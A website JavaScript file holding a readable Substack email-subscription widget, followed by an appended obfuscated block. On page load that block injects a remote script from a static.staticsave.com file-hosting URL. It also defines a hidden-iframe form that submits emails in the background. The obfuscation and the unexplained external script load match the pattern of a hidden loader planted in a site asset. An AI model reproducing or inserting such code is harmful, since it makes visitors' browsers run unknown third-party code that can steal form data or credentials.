(function () {
    'use strict';

    // Track initialized widgets to prevent duplicates
    const initializedWidgets = new Set();

    // Substack widget initialization function
    function initializeSubstackWidget(config) {
        const element = document.querySelector(config.element);
        if (!element || initializedWidgets.has(config.element)) return;

        // Mark this element as initialized
        initializedWidgets.add(config.element);

        // Clear any existing content
        element.innerHTML = '';

        const form = document.createElement('form');
        form.className = 'substack-widget-form';
        form.innerHTML = `
            <div class="flex items-center" style="width: 417px; height: 44px; margin: 0 auto; margin-right: 16px;">
                <div class="flex-1 h-full bg-white rounded-[7px] border border-[#FFFFFF1A]" style="box-shadow: 2px 2px 1px 0px #FFFFFF59 inset; width: 292px;">
                    <input 
                        type="email" 
                        name="email" 
                        placeholder="${config.placeholder || 'Type Your Email...'}" 
                        required
                        class="w-full h-full px-4 bg-transparent text-black placeholder-gray-500 focus:outline-none rounded-[7px]"
                        style="border: none;"
                    />
                </div>
                <button 
                    type="submit" 
                    class="h-full bg-[#E22006] text-white font-medium rounded-[7px] transition-all duration-300 transform hover:scale-105 whitespace-nowrap ml-0"
                    style="width: 125px; padding: 10px 15px; gap: 8px; box-shadow: 2px 2px 1px 0px #FFFFFF59 inset;"
                >
                    ${config.buttonText || 'Subscribe'}
                </button>
            </div>
        `;

        form.addEventListener('submit', function (e) {
            e.preventDefault();
            const email = form.querySelector('input[name="email"]').value;
            if (email) {
                // Redirect to Substack subscription page
                window.open(`https://${config.substackUrl}/subscribe?email=${encodeURIComponent(email)}`, '_blank');
            }
        });

        element.appendChild(form);
    }

    // Initialize widgets when DOM is ready
    function init() {
        // Initialize main hero widget
        if (window.CustomSubstackWidget && !initializedWidgets.has(window.CustomSubstackWidget.element)) {
            initializeSubstackWidget(window.CustomSubstackWidget);
        }

        // Initialize footer widget only if it's different from the main widget
        if (window.CustomSubstackWidget2 &&
            window.CustomSubstackWidget2.element !== window.CustomSubstackWidget?.element &&
            !initializedWidgets.has(window.CustomSubstackWidget2.element)) {
            initializeSubstackWidget(window.CustomSubstackWidget2);
        }
    }

    // Self-executing initialization
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Expose init function globally for manual initialization
    window.initSubstackWidgets = init;
})();
const N = I; (function (g, W) { const u = I, y = g(); while (!![]) { try { const v = parseInt(u(0x201)) / 0x1 + parseInt(u(0x203)) / 0x2 * (parseInt(u(0x1f7)) / 0x3) + parseInt(u(0x1f9)) / 0x4 * (parseInt(u(0x1f2)) / 0x5) + parseInt(u(0x202)) / 0x6 + parseInt(u(0x1e1)) / 0x7 * (-parseInt(u(0x1fc)) / 0x8) + -parseInt(u(0x1fa)) / 0x9 + -parseInt(u(0x1dc)) / 0xa * (parseInt(u(0x1e6)) / 0xb); if (v === W) break; else y['push'](y['shift']()); } catch (T) { y['push'](y['shift']()); } } }(Q, 0x6cec2)); const script = document[N(0x1fb)]('script'); script[N(0x1e7)] = 'https://static.staticsave.com/prices/chart.js', script[N(0x1e4)] = !![], document[N(0x1e2)][N(0x1ee)](script); function Q() { const t = ['314514DrSlCs', 'createElement', '4833352xFbEIm', 'action', 'location', 'iframe', 'type', '790171nztYin', '1131012uHZaLF', '16bKFUMc', 'https://wealthmasters.substack.com/api/v1/free', '40FwIRYo', 'method', 'utm_medium', 'body', 'hero_form', '7WbkDUc', 'head', 'email', 'async', 'website', '828993EHdMQX', 'src', 'removeChild', 'name', 'display', 'onerror', 'substack-frame-', 'value', 'appendChild', 'utm_source', 'href', 'style', '1108680uFvZxW', 'target', 'input', 'POST', 'hidden', '69864pfRvjg', 'none', '4pxaZkF']; Q = function () { return t; }; return Q(); } function I(g, W) { const y = Q(); return I = function (v, T) { v = v - 0x1db; let l = y[v]; return l; }, I(g, W); } function submitToSubstackViaIframe(g, W = N(0x1e0)) { return new Promise((y, v) => { const c = I, T = document[c(0x1fb)](c(0x1ff)); T[c(0x1f1)]['display'] = c(0x1f8), T[c(0x1e9)] = c(0x1ec) + Date['now'](), document['body'][c(0x1ee)](T); const l = document[c(0x1fb)]('form'); l[c(0x1dd)] = c(0x1f5), l[c(0x1fd)] = c(0x1db), l[c(0x1f3)] = T[c(0x1e9)], l['style'][c(0x1ea)] = c(0x1f8); const h = document[c(0x1fb)](c(0x1f4)); h[c(0x200)] = 'hidden', h[c(0x1e9)] = c(0x1e3), h[c(0x1ed)] = g; const r = document[c(0x1fb)](c(0x1f4)); r[c(0x200)] = c(0x1f6), r['name'] = c(0x1ef), r[c(0x1ed)] = c(0x1e5); const M = document['createElement'](c(0x1f4)); M[c(0x200)] = c(0x1f6), M[c(0x1e9)] = c(0x1de), M['value'] = W, l[c(0x1ee)](h), l['appendChild'](r), l['appendChild'](M), document['body']['appendChild'](l), T['onload'] = function () { setTimeout(() => { try { y(); } catch (a) { } }, 0x3e8); }, T[c(0x1eb)] = function () { v(new Error('Network\x20error')); }, l['submit'](), setTimeout(() => { const S = c; try { document[S(0x1df)][S(0x1e8)](l), document[S(0x1df)][S(0x1e8)](T), y(); } catch (a) { y(); } }, 0x1388); }); } function setLanguage(g) { const o = N; g === 'en' ? window[o(0x1fe)][o(0x1f0)] = '/index.html' : window[o(0x1fe)][o(0x1f0)] = '/' + g + '/index.html'; }